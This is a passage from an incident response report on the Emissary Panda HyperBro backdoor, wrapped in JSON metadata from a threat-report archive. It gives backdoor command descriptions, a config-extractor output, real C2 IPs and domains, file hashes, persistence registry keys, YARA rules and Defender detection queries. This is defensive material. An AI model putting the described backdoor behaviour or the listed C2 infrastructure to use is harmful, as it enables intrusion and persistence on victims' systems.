□ The results are sent to the C2 server|\n|0x1D|Update malware: □ Drops a new executable under Temp: □ %Temp%\\<current clock tick>.exe □ Launches the new executable □ Exits the running process after launch was successful|\n|0x1F|Updates the configuration of the backdoor: □ Copies the new configuration from the received packet to the in-memory configuration of the backdoor (TConfig) □ Connects to new C2 server □ Closes old connection, after the new connection was established successfully □ Subcommand 0x10 □ Updates additional configuration of the running malware □ Subcommand 0x14 □ Update configuration regarding persistence □ Update Registry keys □ Update Windows Service □ Update File paths|\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 8.4 HyperBro Configuration Extractor\n\nIn our online research about Emissary Panda and HyperBro, we found multiple descriptions of the malware\nbut no tool, which is able to extract the malware configuration from the encrypted thumb.dat file. In\norder to develop such a tool, we reverse engineered the malware and re-implemented the decryption of\n```\nthumb.dat, the decompression of Stage 3, and implemented a configuration parser for Stage 3. The tool\n\n```\n[can be found in our GitHub Repository: https://github.com/hvs-consulting/HyperBroExtractor](https://github.com/hvs-consulting/HyperBroExtractor)\n\nThe tool runs through the steps from the thumb.dat as input to the decompressed PE file (Stage 3), as\ndisplayed in Figure 8.\n```\n$ python3 HyperBro_extract_config.py -i thumb.dat -k fc\n[*] The key is: 0xfc\n[*] Decryption successful\n[*] Decompression of PE successful\n[*] HyperBro extracted config: \nLegit launcher used for DLL-Side-Loading: msmpeng.exe\nStage 1:                  vftrace.dll\nStage 2:                  thumb.dat\nStage 3:                  thumb.dat\nMalware Directory:             windefenders\nDomain (changed at runtime):        Default\nWindows Service used for persistence:   Windows Defenders\nCommand and Control IP address:      104.168.236.46\nUser Agent:                Mozilla/5.0 (Windows NT 6.3; WOW64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36\nHTTPS Request Information:         POSThttps://%s:%d/api/v2/ajax\nPipe name used for IPC:          \\\\.\\pipe\\testpipe\n\n```\nAt first, the thumb.dat file needs to be decrypted. Therefore, we analyzed the decryption algorithm\ncontained in Stage 1 and extracted the corresponding key. Since the key is only one byte long, and it is\nsimply added to each byte of the thumb.dat, the encryption is not very strong. To increase the stability of\nour tool, a brute-force function for the one-byte key was implemented as well as a detection for a correct\ndecryption. After the correct key is found, the thumb.dat is decrypted.\n\nNext, the beginning of the PE file is identified in the decrypted thumb.dat. The file consists of the PE Loader\n(Stage 2), and a compressed PE file (Stage 3). As stage 3 is compressed with LZNT1, a LZNT1 compressed\nPE header is used as a signature to identify the start of Stage 3. Next, the compressed PE file can be\ndecompressed, which results in the actual HyperBro backdoor.\n\nLast, the configuration of Stage 3 is parsed by the tool, i.e., it extracts multiple hard-coded parameters, like\nthe IP of the initial C2 server, the user agent utilized in HTTP requests, etc. An example of the output can\nbe seen above\n\nIn this case, the key is specified as a command-line parameter. The resulting IoCs as well as their utilization\nfor detection, are described in more detail in Section 7.\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n# 9 Detection of Emissary Pandas activities\n\n## 9.1 Indicators of Compromise (IOCs)\n\nThe IOCs in this section were partially collected during the incident and partially gathered via OSINT\nresearch. If you plan to use these IOCs in your organization, we recommend copying them from our public\nGitHub Repository:\n\n[https://github.com/hvs-consulting/ioc_signatures/tree/main/Emissary_Panda_APT27](https://github.com/hvs-consulting/ioc_signatures/tree/main/Emissary_Panda_APT27)\n\nThe repository also contains a MISP Event[35] which is structured in MISP objects and comprises additional\ncontextual information. All the IOCs are classified as TLP White.\n\n**Category** **Type** **Value** **Comment**\n\nArtifacts dropped named pipe testpipe HyperBro RAT - named pipe\n\nArtifacts dropped windows- windefenders HyperBro RAT - persistence mechanism\nservicename\n\nArtifacts dropped windows- windefende-921919155 Persistence mechanism of HyperBro RAT\nservicename\n\nNetwork activity domain dataanalyticsclub.com Domain address used for C2 communication\n\nNetwork activity ip-dst 34.90.207.23 APT27 C2 used during Hafnium attacks\nreported by welivesecurity.com\nNetwork activity ip-dst 103.79.77.200 IP address used for C2 communication\n\nNetwork activity ip-dst 104.168.236.46 IP address used for C2 communication\n\nNetwork activity ip-dst 193.203.203.26 IP address used for C2 communication\n\nNetwork activity ip-dst 74.119.194.153 IP address used for C2 communication\n\nNetwork activity ip-dst 87.98.190.184 IP address used for C2 communication\n\nNetwork activity ip-dst 107.148.131.210 IP address used for C2 communication\n\nNetwork activity ip-dst 35.187.148.253 IP address used for C2 communication\n\nNetwork activity ip-dst 103.79.78.48 IP address used for C2 communication\n\nNetwork activity ip-dst 45.77.250.141 IP address used for C2 communication\n\nNetwork activity domain image.dataanalyticsclub.com Domain address used for C2 communication\n\nNetwork activity domain avatars.dataanalyticsclub.com Domain address used for C2 communication\n\nNetwork activity domain fonts.dataanalyticsclub.com PassiveTotal First 2021-11-10 Last 2022-0103\nNetwork activity url /api/v2/ajax Malicious endpoint on C2 servers\n\nNetwork activity url https://107.148.131.210/api/v2/ajax URL used for C2 communication\n\nNetwork activity url http://35.187.148.253/api/v2/ajax URL used for C2 communication\n\n\nNetwork activity text Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53 HyperBro RAT - user agent\n7.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/5\n37.36\n\nPayload delivery filename %PROGRAMFILES%\\Common Files\\windefenders\\vftrace. HyperBro RAT - Stage 1\ndll\n\nPayload delivery filename %PROGRAMFILES%\\Common Files\\windefenders\\thumb. HyperBro RAT - Stage 2\ndat\n\nPayload delivery filename %PROGRAMFILES%\\Common Files\\windefenders\\config.i File containing GUID created upon HyperBro\nni execution\n\nPayload delivery filename %PROGRAMFILES%\\Common Files\\vfhost\\VFTRACE.DLL HyperBro RAT - Stage 1\n\n35 [https://www.misp-project.org/](https://www.misp-project.org/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n**Category** **Type** **Value** **Comment**\n\nPayload delivery filename %PROGRAMFILES%\\Common HyperBro RAT - legit CyberArk Software\nFiles\\windefenders\\msmpeng.exe binary used for side-loading\n\nPayload delivery filename vftrace.dll HyperBro RAT - Stage 1\n\nPayload delivery filename thumb.dat HyperBro RAT - Stage 2\n\nPayload delivery filename config.ini File containing GUID created upon HyperBro\nexecution\nPayload delivery filename msmpeng.exe HyperBro RAT - legit CyberArk Software\nbinary used for side-loading\nPayload delivery filename rar.exe Rar.exe (WinRar)\n\nPayload delivery imphash 182f35372e9fd050b6e0610238bcd9fd HyperBro RAT - Stage 1\n\nPayload delivery md5 7655ff65f74f08ee2c54f44e5ef8f098 HyperBro RAT - Stage 1\n\nPayload delivery md5 fa0b6ff0898acaa50563c1cb89524fcf HyperBro RAT - Stage 1\n\nPayload delivery md5 3a528cc7cfa7d7cd338c285839c3c727 HyperBro RAT - Stage 2\n\nPayload delivery md5 84f09d192ec90542ede22c370836ffa6 HyperBro RAT - Stage 2\n\nPayload delivery md5 832415bba4378181e3c975f247b9d0e8 HyperBro RAT - Stage 1\n\nPayload delivery md5 42be134aeca1d88024b0d1baac0726d2 HyperBro RAT - Stage 1\n\nPayload delivery md5 161d3039d7ee393820acab012f4cc85e HyperBro RAT - Stage 1\n\nPayload delivery md5 061b1d1378c06f9ed46b00fe202f39d8 HyperBro RAT - Stage 2\n\nPayload delivery md5 4896a86615ef6835861404bb63a97d7a HyperBro RAT - Stage 2\n\nPayload delivery md5 4109ac08bdc8591c7b46348eb1bca85d HyperBro RAT - legit CyberArk Software\nbinary used for side-loading\nPayload delivery md5 0af2e05abc0ea27d33aa92fc2924655a Rar.exe (WinRar)\n\nPayload delivery md5 60d5648d35bacf5c7aa713b2a0d267d3 Rar.exe (WinRar)\n\nPayload delivery md5 5c1c0bfdf0b3abcf4872b605dbea8b1a HyperBro RAT - Stage 3\n\nPayload delivery md5 80df708149bc7d2b19afd698def598f5 HyperBro RAT - Stage 2 (decrypted)\n\nPayload delivery sha1 3c7beb8978feac9ba8f5bab0656242232471bf7d HyperBro RAT - Stage 1\n\nPayload delivery sha1 e0d6fcdf23c06c8e8016b0c93a1072c4bab0b659 HyperBro RAT - Stage 1\n\nPayload delivery sha1 0dfbbaf0267d79bbe15b1f5a78e1f1bcceea99ca HyperBro RAT - Stage 2\n\nPayload delivery sha1 7fb23c6b4db90b55694bdd1cc5c1b4c706a4e181 HyperBro RAT - Stage 2\n\nPayload delivery sha1 7d92970e8394b20b887bf2de60408da15e260d9f HyperBro RAT - Stage 1\n\nPayload delivery sha1 ba2ba390a13938de4d176addd7417ad9a1df2715 HyperBro RAT - Stage 1\n\nPayload delivery sha1 6043a8e4f14ac398fd25c10f20d01ba00eb22883 HyperBro RAT - Stage 1\n\nPayload delivery sha1 0acea28ddbfb86dc335c295475e5c9a2338bf4e3 HyperBro RAT - Stage 2\n\nPayload delivery sha1 95739e00e606e8e7a5c2f658b05820db7ee51910 HyperBro RAT - Stage 2\n\nPayload delivery sha1 6423d1c324522bfd2b65108b554847ac4ab02479 HyperBro RAT - legit CyberArk Software\nbinary used for side-loading\nPayload delivery sha1 755b979293a43e3a5de23933f35ec6a94b0971ee Rar.exe (WinRar)\n\nPayload delivery sha1 a62af4ac233d914a25e79ec0705e2a187ebd7567 Rar.exe (WinRar)\n\nPayload delivery sha1 6d24b289ab4819774ac250d5d4f024e9dee7579c HyperBro RAT - Stage 3\n\nPayload delivery sha1 d3cc018a28b39698bfa486f6e505be4c68573af0 HyperBro RAT - Stage 2 (decrypted)\n\n\nPayload delivery sha256 52072a8f99dacd5c293fccd051eab95516d8b880cd2bc5a7\ne0f4a30d008e22a7\n\nPayload delivery sha256 5aa4dffee6acd65092ddaf7192c1009befd14eb079e694f1\n32707dcda22f9e7f\n\nPayload delivery sha256 2ca4181d958369ff92121700c681442664454b0ec4f7942\n984611cc64caeca61\n\nPayload delivery sha256 f2ba8b8aabf73020febd3a925276d52ce88f295537fe5772\n3df714c13f5a8780\n\nPayload delivery sha256 333b52c2cfac56b86ee9d54aef4f0ff4144528917bc1aa1fe\n1613efc2318339a\n\nPayload delivery sha256 847fce4a6c3561f51bb94dc682a16908d4ce5b0cf9d4315d\nb6d642ad2a94f8bc\n\nPayload delivery sha256 205aa1007e97a58ecb6e9f9a143ed7d337de98864d566d\n8f6967a9496beff815\n\n\nHyperBro RAT - Stage 1\n\nHyperBro RAT - Stage 1\n\nHyperBro RAT - Stage 2\n\nHyperBro RAT - Stage 2\n\nHyperBro RAT - Stage 1\n\nHyperBro RAT - Stage 1\n\nHyperBro RAT - Stage 1\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n**Category** **Type** **Value** **Comment**\n\nPayload delivery sha256 fd15d8bf6dd3858897dbc352b64577fd73cfd7ba4c3e4c7e HyperBro RAT - Stage 2\n77a070fa43264216\n\nPayload delivery sha256 ba3a9382c0e5857f496e998635f8ba0ae2aedf4782defcbe HyperBro RAT - Stage 2\n204eaeea5c7e8e24\n\nPayload delivery sha256 df847abbfac55fb23715cde02ab52cbe59f14076f9e4bd15 HyperBro RAT - legit CyberArk Software\nedbe28dcecb2a348 binary used for side-loading\n\nPayload delivery sha256 8c4b78ee13c6c7639086b46efdcdebf0cac37ab87fef99ab Rar.exe (WinRar)\n2c7a72f217b5b03c\n\nPayload delivery sha256 4b16ea1b1273f8746cf399c71bfc1f5bff7378b5414b4ea04 Rar.exe (WinRar)\n4c55e0ee08c89d3\n\nPayload delivery sha256 624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2 HyperBro RAT - Stage 3\ne2a5683a04e36213e8\n\nPayload delivery sha256 fc5a58bf0fce9cb96f35ee76842ff17816fe302e3164bc7c6 HyperBro RAT - Stage 2 (decrypted)\na5ef46f6eff67ed\n\nPayload delivery x509- 7cb43e5c475d7f369fb090e9a79fe1f841bd1309 HyperBro RAT - legit CyberArk Software\nfingerprint- binary used for side-loading\nsha1\n\nPersistence regkey SOFTWARE\\WOW6432Node\\Microsoft\\config_ HyperBro RAT - registry key used to persist\nmechanism C2 config\n\nPersistence regkey HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HyperBro RAT - persistence mechanism\nmechanism \\windefenders\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n\n## 9.2 YARA Rules\n\nThe following YARA rules can be used for the detection of the HyperBro malware. Alternatively, you can\nuse the THOR APT Scanner[36] since it already includes these YARA detection rules as well as many more.\nThe YARA rules were also published in our GitHub repository. One additional rule can be found there,\nwhich was too bulky for this report:\n\n[https://github.com/hvs-consulting/ioc_signatures/tree/main/Emissary_Panda_APT27](https://github.com/hvs-consulting/ioc_signatures/tree/main/Emissary_Panda_APT27)\n```\nrule HvS_APT27_HyperBro_Decrypted_Stage2 {\n  meta:\n   description = \"HyperBro Stage 2 and compressed Stage 3 detection\"\n   license = \"https://creativecommons.org/licenses/by-nc/4.0/\"\n   author = \"Moritz Oettle\"\n   reference = \"https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\"\n   date = \"2022-02-07\"\n   hash1 = \"fc5a58bf0fce9cb96f35ee76842ff17816fe302e3164bc7c6a5ef46f6eff67ed\"\n  strings:\n   $lznt1_compressed_pe_header_small = { FC B9 00 4D 5A 90 } // This is the lznt1 compressed PE header\n   $lznt1_compressed_pe_header_large_1 = { FC B9 00 4D 5A 90 00 03 00 00 00 82 04 00 30 FF FF 00 }\n   $lznt1_compressed_pe_header_large_2 = { 00 b8 00 38 0d 01 00 40 04 38 19 00 10 01 00 00 }\n   $lznt1_compressed_pe_header_large_3 = { 00 0e 1f ba 0e 00 b4 09 cd 00 21 b8 01 4c cd 21 }\n   $lznt1_compressed_pe_header_large_4 = { 54 68 00 69 73 20 70 72 6f 67 72 00 61 6d 20 63 }\n   $lznt1_compressed_pe_header_large_5 = { 61 6e 6e 6f 00 74 20 62 65 20 72 75 6e 00 20 69 }\n   $lznt1_compressed_pe_header_large_6 = { 6e 20 44 4f 53 20 00 6d 6f 64 65 2e 0d 0d 0a 02 }\n  condition:\n   filesize < 200KB and\n   ($lznt1_compressed_pe_header_small at 0x9ce) or (all of ($lznt1_compressed_pe_header_large_*))\n}\n\n```\n\n36 [https://www.nextron-systems.com/thor/](https://www.nextron-systems.com/thor/)\n\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n```\nrule HvS_APT27_HyperBro_Stage3 {\n\n```\n```\n meta:\n\n```\n```\n   description = \"HyperBro Stage 3 detection - also tested in memory\"\n\n```\n```\n   license = \"https://creativecommons.org/licenses/by-nc/4.0/\"\n\n```\n```\n   author = \"Markus Poelloth\"\n\n```\n```\n   reference = \"https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\"\n\n```\n```\n   date = \"2022-02-07\"\n\n```\n```\n   hash1 = \"624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8\"\n\n```\n```\n strings:\n\n```\n```\n   $s1 = \"\\\\cmd.exe /A\" fullword wide\n\n```\n```\n   $s2 = \"vftrace.dll\" fullword wide\n   $s3 = \"msmpeng.exe\" fullword wide\n\n```\n```\n   $s4 = \"\\\\\\\\.\\\\pipe\\\\testpipe\" fullword wide\n\n```\n```\n   $s5 = \"thumb.dat\" fullword wide\n\n```\n```\n   $g1 = \"%s\\\\%d.exe\" fullword wide\n\n```\n```\n   $g2 = \"https://%s:%d/api/v2/ajax\" fullword wide\n\n```\n```\n   $g3 = \" -k networkservice\" fullword wide\n\n```\n```\n   $g4 = \" -k localservice\" fullword wide\n\n```\n```\n condition:\n\n```\n```\n   uint16(0) == 0x5a4d and filesize < 300KB and\n\n```\n```\n   (( 4 of ($s*) ) or (4 of ($g*)))\n\n```\n```\n}\nrule HvS_APT27_HyperBro_Stage3_C2 {\n\n```\n```\n meta:\n\n```\n```\n   description = \"HyperBro Stage 3 C2 path and user agent detection - also tested in memory\"\n\n```\n```\n   license = \"https://creativecommons.org/licenses/by-nc/4.0/\"\n\n```\n```\n   author = \"Marc Stroebel\"\n\n```\n```\n   reference = \"https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\"\n\n```\n```\n   date = \"2022-02-07\"\n\n```\n```\n   hash1 = \"624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8\"\n\n```\n```\n strings:\n\n```\n```\n   $s1 = \"api/v2/ajax\" ascii wide nocase\n\n```\n```\n   $s2 = \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116\n\n```\n```\nSafari/537.36\" ascii wide nocase\n\n```\n```\n condition:\n\n```\n```\n   all of them\n\n```\n```\n}\n\n```\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n```\nrule HvS_APT27_HyperBro_Stage3_Persistence {\n\n```\n```\n meta:\n\n```\n```\n   description = \"HyperBro Stage 3 registry keys for persistence\"\n\n```\n```\n   license = \"https://creativecommons.org/licenses/by-nc/4.0/\"\n\n```\n```\n   author = \"Marko Dorfhuber\"\n\n```\n```\n   reference = \"https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\"\n\n```\n```\n   date = \"2022-02-07\"\n\n```\n```\n   hash1 = \"624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8\"\n\n```\n```\n strings:\n\n```\n```\n   $ = \"SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\config_\" ascii\n\n```\n```\n   $ = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\windefenders\" ascii\n\n```\n```\n condition:\n\n```\n```\n   1 of them\n\n```\n```\n}\n\n## 9.3 Defender Detection Rules\n// description: Detects pipe of HyperBro used for IPC\n\n```\n```\n// license: https://creativecommons.org/licenses/by-nc/4.0/\n// author: Markus Poelloth\n\n```\n```\n// reference: https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\n// date: 2022-02-07\n\n```\n```\nDeviceEvents\n| where ActionType == \"NamedPipeEvent\" and AdditionalFields contains \"testpipe\"\n\n```\n```\n// description: Detects big newly created rar files, as used by Emissary Panda for collection\n// license: https://creativecommons.org/licenses/by-nc/4.0/\n\n```\n```\n// author: Moritz Oettle\n// reference: https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\n\n```\n```\n// date: 2022-02-07\nDeviceFileEvents \n\n```\n```\n| where ActionType == 'FileCreated'\n| where FileName endswith \".rar\"\n\n```\n```\n| where FileSize > 5000000000 // 5 GB\n| sort by FileSize desc\n\n```\n\n-----\n\nHvS Incident Response Report\n\nThe APT Fallout of Vulnerabilities such as ProxyLogon, OGNL Injection and log4shell\n```\n// description: Detects C2 network events used by Emissary Panda\n// license: https://creativecommons.org/licenses/by-nc/4.0/\n// author: Marc Stroebel\n// reference: https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\n// date: 2022-02-07\nlet IPs = pack_array(\"87.98.190.184\", \"34.90.207.23\", \"103.79.77.200\", \"104.168.236.46\", \"193.203.203.26\",\n\n```\n```\n\"103.79.78.48\", \"35.187.148.253\", \"107.148.131.210\", \"45.77.250.141\", \"74.119.194.153\");\nlet C2s = pack_array(\"dataanalyticsclub.com\", \"image.dataanalyticsclub.com\", \"fonts.dataanalyticsclub.com\",\n\n```\n```\n\"avatars.dataanalyticsclub.com\");\nDeviceNetworkEvents\n\n```\n```\n| where RemoteIP in(IPs) or RemoteUrl in (C2s)\n// description: Detects commands used by Emissary Panda\n\n```\n```\n// notes: might be prone to false positives\n// license: https://creativecommons.org/licenses/by-nc/4.0/\n\n```\n```\n// author: Marko Dorfhuber\n// reference: https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\n\n```\n```\n// date: 2022-02-07\nDeviceProcessEvents \n\n```\n```\n| where InitiatingProcessCommandLine == @\"cmd.exe /A\"\n// description: Detects event that loads the malicious DLL of Emissary Panda based on name\n\n```\n```\n// notes: might be prone to false positives\n// license: https://creativecommons.org/licenses/by-nc/4.0/\n\n```\n```\n// author: Moritz Oettle\n// reference: https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27\n\n```\n```\n// date: 2022-02-07\nDeviceImageLoadEvents \n\n```\n```\n| where ActionType == \"ImageLoaded\" and FileName contains \"VFTRACE.DLL\"\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/mkk5m9l8oozhmwvkqwqkc4uosuwqd6ru",
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-14 - The APT Fallout of Vulnerabilities such as ProxyLogon,  OGNL Injection, and log4shell.pdf"
    ],
    "report_names": [
        "HVSConsulting_EmissaryPanda(02-14-2022)",
        "2022-02-14 - The APT Fallout of Vulnerabilities such as ProxyLogon,  OGNL Injection, and log4shell.pdf"
    ],
    "threat_actors": [
        {
            "id": "ba3eea09-ce30-4cfa-ae3a-b5992c4b81f8",
            "created_at": "2022-10-25T15:50:23.441443Z",
            "updated_at": "2025-03-27T02:00:55.469723Z",
            "deleted_at": null,
            "main_name": "Aquatic Panda",
            "aliases": [
                "Aquatic Panda"
            ],
            "source_name": "MITRE:Aquatic Panda",
            "tools": [
                "Wevtutil",
                "Winnti for Windows",
                "njRAT",
                "Cobalt Strike",
                "ShadowPad",
                "Winnti for Linux"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "19935e32-f1a5-462d-8934-8b1c3bf3b5f2",
            "created_at": "2022-10-25T16:07:23.36465Z",
            "updated_at": "2025-03-27T02:02:09.760568Z",
            "deleted_at": null,
            "main_name": "Aquatic Panda",
            "aliases": [],
            "source_name": "ETDA:Aquatic Panda",
            "tools": [
                "Agentemis",
                "Bladabindi",
                "Cobalt Strike",
                "CobaltStrike",
                "Fishmaster",
                "JollyJellyfish",
                "Jorik",
                "cobeacon",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3c5b0e7e-2388-4b63-9b97-6b027bec4bf7",
            "created_at": "2023-01-06T13:46:39.068694Z",
            "updated_at": "2025-03-27T02:00:02.989445Z",
            "deleted_at": null,
            "main_name": "Calypso",
            "aliases": [
                "BRONZE MEDLEY"
            ],
            "source_name": "MISPGALAXY:Calypso",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a4aca3ca-9e04-42d1-b037-f7fb3fbab0b1",
            "created_at": "2023-01-06T13:46:39.042499Z",
            "updated_at": "2025-03-27T02:00:02.984002Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Colourful Panda",
                "BRONZE DUDLEY"
            ],
            "source_name": "MISPGALAXY:TA428",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5bbced13-72f7-40dc-8c41-dcce75bf885e",
            "created_at": "2022-10-25T15:50:23.695735Z",
            "updated_at": "2025-03-27T02:00:55.525839Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Winnti Group"
            ],
            "source_name": "MITRE:Winnti Group",
            "tools": [
                "PipeMon",
                "Winnti for Windows",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "274f04ff-fae8-4e90-bcf5-3e391a860cd5",
            "created_at": "2023-12-08T02:00:05.75114Z",
            "updated_at": "2025-03-27T02:00:03.265934Z",
            "deleted_at": null,
            "main_name": "UNC215",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC215",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "13d9c5fc-af82-4474-90dd-188c4e40a399",
            "created_at": "2022-10-25T16:07:23.435079Z",
            "updated_at": "2025-03-27T02:02:09.800346Z",
            "deleted_at": null,
            "main_name": "Calypso",
            "aliases": [
                "Bronze Medley"
            ],
            "source_name": "ETDA:Calypso",
            "tools": [
                "Agent.dhwf",
                "Byeby",
                "Calypso RAT",
                "DCSync",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EternalBlue",
                "EternalRomance",
                "FlyingDutchman",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "NBTscan",
                "OS_Check_445",
                "PlugX",
                "Quarks PwDump",
                "RedDelta",
                "SAMRID",
                "Sogu",
                "SysInternals",
                "TCP Port Scanner",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Whitebird",
                "Xamtrav",
                "ZXPortMap",
                "nbtscan",
                "netcat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f3b19931-3751-4ece-a235-15b397951dc2",
            "created_at": "2022-10-25T16:07:23.889537Z",
            "updated_at": "2025-03-27T02:02:10.015565Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "ETDA:Nazar",
            "tools": [
                "Distribute.exe",
                "EYService",
                "GpUpdates.exe",
                "Microolap Packet Sniffer",
                "TCPDUMP for Windows"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "945a572f-ebe3-4e2f-a288-512fe751cfa8",
            "created_at": "2022-10-25T16:07:24.413971Z",
            "updated_at": "2025-03-27T02:02:10.212853Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Wicked Panda",
                "Winnti Group"
            ],
            "source_name": "ETDA:Winnti Group",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "FunnySwitch",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
